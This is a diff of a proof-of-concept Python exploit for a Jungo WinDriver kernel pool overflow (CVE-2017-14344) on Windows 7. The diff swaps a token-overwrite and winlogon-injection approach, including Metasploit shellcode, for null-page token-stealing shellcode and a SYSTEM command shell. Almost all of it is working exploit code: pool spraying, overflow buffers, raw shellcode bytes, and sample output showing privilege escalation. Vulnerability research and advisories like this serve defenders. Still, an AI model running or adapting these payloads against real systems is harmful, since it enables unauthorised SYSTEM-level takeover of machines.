@@ -10,7 +10,6 @@ Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
 CVE:      CVE-2017-14344
 Author:   Steven Seeley (mr_me) of Source Incite
 Affected: <= v12.4.0
-Thanks:   @dronesec & @FuzzySec !
 
 Summary:
 ========
@@ -31,56 +30,46 @@ Timeline:
 2017-09-06 – No response from Jungo
 2017-09-06 – Public 0day release of advisory
 
-Exploitation:
-=============
-
-This exploit uses a data only attack via the Quota Process Pointer Overwrite technique. We smash the token and dec a controlled address by 0x50 (size of the Mutant) to enable SeDebugPrivilege's. Then we inject code into a system process.
-
-References:
-===========
-
-- https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf
-- https://github.com/hatRiot/token-priv
-
 Example:
 ========
 
-C:\Users\user\Desktop>whoami
-debugee\user
+C:\Users\Guest\Desktop>icacls poc.py
+poc.py NT AUTHORITY\Authenticated Users:(I)(F)
+       NT AUTHORITY\SYSTEM:(I)(F)
+       BUILTIN\Administrators:(I)(F)
+       BUILTIN\Users:(I)(F)
+       Mandatory Label\Low Mandatory Level:(I)(NW)
 
-C:\Users\user\Desktop>poc.py
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\Guest\Desktop>whoami
+debugee\guest
+
+C:\Users\Guest\Desktop>poc.py
 
         --[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]
                        Steven Seeley (mr_me) of Source Incite
 
-(+) attacking WinDrvr1240 for a data only attack...
+(+) spraying pool with mixed objects...
 (+) sprayed the pool!
+(+) making pool holes...
 (+) made the pool holes!
-(+) leaked token 0xa15535a0
+(+) allocating shellcode...
+(+) allocated the shellcode!
 (+) triggering pool overflow...
 (+) allocating pool overflow input buffer
 (+) elevating privileges!
-(+) got a handle to winlogon! 0x2bd10
-(+) allocated shellcode in winlogon @ 0xc0000
-(+) WriteProcessMemory returned: 0x1
-(+) RtlCreateUserThread returned: 0x0
-(+) popped a SYSTEM shell!
-
-C:\Users\user\Desktop>
-
-in another terminal...
-
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
-C:\Windows\system32>whoami
+C:\Users\Guest\Desktop>whoami
 nt authority\system
 
-C:\Windows\system32>
+C:\Users\Guest\Desktop>
 """
 from ctypes import *
 from ctypes.wintypes import *
-import struct, sys, os, time, psutil
+import struct, sys, os, time
 from platform import release, architecture
 
 ntdll    = windll.ntdll
@@ -201,6 +190,45 @@ def get_handles():
     for handle in pHandles.contents:
         yield handle.UniqueProcessId, handle.HandleValue, handle.Object
 
+def we_can_alloc_shellcode():
+    """ 
+    This function allocates the shellcode @ the null page making
+    sure the new OkayToCloseProcedure pointer points to shellcode.
+    """
+    baseadd   = c_int(0x00000004)
+    null_size = c_int(0x1000)
+
+    tokenstealing = (
+    "\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
+    "\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
+    "\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
+    "\x00" )
+    
+    OkayToCloseProcedure = struct.pack("<L", 0x00000078)
+    sc  = "\x42" * 0x70 + OkayToCloseProcedure
+
+    # first we restore our smashed TypeIndex
+    sc += "\x83\xC6\x0c"              # add esi, 0c
+    sc += "\xc7\x06\x0a\x00\x08\x00"  # mov [esi], 8000a
+    sc += "\x83\xee\x0c"              # sub esi, 0c 
+    sc += tokenstealing
+    sc += "\x90" * (0x400-len(sc))
+    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+                                              POINTER(c_int), c_int, c_int]
+    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
+                                             byref(null_size), 
+                                             MEM_RESERVE|MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE)
+    if dwStatus != STATUS_SUCCESS:
+        print "(-) error while allocating the null paged memory: %s" % dwStatus
+        return False
+    written = c_ulong()
+    write = kernel32.WriteProcessMemory(0xffffffff, 0x00000004, sc, 0x400, byref(written))
+    if write == 0:
+        print "(-) error while writing our junk to the null paged memory: %s" % write
+        return False
+    return True
+
 def we_can_spray():
     """
     Spray the Kernel Pool with IoCompletionReserve and Event Objects. 
@@ -226,8 +254,6 @@ def alloc_pool_overflow_buffer(base, input_size):
     input  = struct.pack("<I", 0x0000001a)     # size
     input += "\x44" * 0x398                    # offset to overflown chunks
 
-    priv = token + 0x40 + 0x8                  # Enabled
-    
     # patch
     input += struct.pack("<I", 0x040a008c)     # _POOL_HEADER
     input += struct.pack("<I", 0xe174754d)     # _POOL_HEADER
@@ -241,8 +267,8 @@ def alloc_pool_overflow_buffer(base, input_size):
     input += struct.pack("<I", 0x00000001)
     input += struct.pack("<I", 0x00000001)
     input += "\x44" * 4
-    input += struct.pack("<I", 0x0008000e)
-    input += struct.pack("<I", priv)           # Quota Process Pointer Overwrite
+    input += struct.pack("<I", 0x00080000)     # smashed TypeIndex
+    input += struct.pack("<I", 0x00000000)
 
     # filler
     input += "\x43" * (input_size-len(input))
@@ -314,7 +340,7 @@ def we_can_make_pool_holes():
             bin = []
             
             # object sizes
-            Mutant_size = 0x50
+            Mutant_size         = 0x50
 
             # we use 0x10 since thats the left over freed chunk from filling the page
             offset = Mutant_size + 0x10
@@ -337,21 +363,6 @@ def we_can_make_pool_holes():
             kernel32.CloseHandle(handle)
     return True
 
-def we_can_leak_token():
-    """
-    Uses NtQuerySystemInformation to leak the token
-    """
-    global token
-    hProcess = HANDLE(windll.kernel32.GetCurrentProcess())
-    hToken = HANDLE()
-    TOKEN_ALL_ACCESS = 0xf00ff
-    windll.advapi32.OpenProcessToken(hProcess,TOKEN_ALL_ACCESS, byref(hToken))
-    for pid, handle, obj in get_handles():
-        if pid==os.getpid() and get_type_info(handle) == "Token":
-            token = obj
-            return True
-    return False
-
 def trigger_lpe():
     """
     This function frees the IoCompletionReserve objects and this triggers the 
@@ -362,51 +373,7 @@ def trigger_lpe():
     # full of Mutants and that its the 2nd chunk after the overflowed buffer.
     for v in to_free:
         kernel32.CloseHandle(v)
-
-def get_winlogin_pid():
-    for proc in psutil.process_iter():
-
-        # choose whateva system process
-        if proc.name() == "winlogon.exe":
-            return proc.pid
-    return 0
-
-def we_can_inject():
-    page_rwx_value = 0x40
-    process_all = 0x1F0FFF
-    memcommit = 0x00001000
-    process_handle = windll.kernel32.OpenProcess(process_all, False, get_winlogin_pid()) # WinLogin
-    if process_handle == 0:
-        return False
-    print "(+) got a handle to winlogon! 0x%x" % process_handle
-
-    # metasploit EXITFUNC=Thread
-    buf =  ""
-    buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
-    buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
-    buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
-    buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
-    buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
-    buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
-    buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
-    buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
-    buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
-    buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
-    buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
-    buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
-    buf += "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
-    buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
-    buf += "\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"
-
-    shellcode_length = len(buf)
-    hThread = HANDLE()
-    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
-    print "(+) allocated shellcode in winlogon @ 0x%x" % memory_allocation_variable
-    res = windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, buf, shellcode_length, 0)
-    print "(+) WriteProcessMemory returned: 0x%x" % res
-    res = windll.ntdll.RtlCreateUserThread(process_handle, None, 0, 0, 0, 0, memory_allocation_variable, 0, byref(hThread), 0)
-    print "(+) RtlCreateUserThread returned: 0x%x" % res
-    return True
+    os.system("cmd.exe")
 
 def main():
     print "\n\t--[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]"
@@ -417,19 +384,19 @@ def main():
         print "    it was only designed for Windows 7 x86."
         sys.exit(-1)
 
-    print "(+) attacking WinDrvr1240 for a data only attack..."
+    print "(+) spraying pool with mixed objects..."
     if we_can_spray():
         print "(+) sprayed the pool!"
+        print "(+) making pool holes..."
         if we_can_make_pool_holes():
             print "(+) made the pool holes!"
-            if we_can_leak_token():
-                print "(+) leaked token 0x%x" % token
+            print "(+) allocating shellcode..."
+            if we_can_alloc_shellcode():
+                print "(+) allocated the shellcode!"
                 print "(+) triggering pool overflow..."
                 if we_can_trigger_the_pool_overflow():
                     print "(+) elevating privileges!"
                     trigger_lpe()
-                    if we_can_inject():
-                        print "(+) popped a SYSTEM shell!"
 
 if __name__ == '__main__':
     main()
